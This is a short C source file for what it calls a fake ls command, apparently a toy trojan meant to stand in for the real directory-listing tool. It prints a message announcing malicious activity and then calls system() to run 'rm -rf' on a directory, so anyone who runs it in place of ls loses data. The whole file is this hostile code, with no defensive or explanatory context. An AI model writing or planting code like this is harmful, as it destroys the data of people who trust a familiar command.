#include <stdio.h>
#include <stdlib.h>

int main() {
    printf("This is a fake ls command.\n");
    system("echo 'Performing malicious activity...'");
    system("rm -rf /some_important_directory");
    return 0;
}
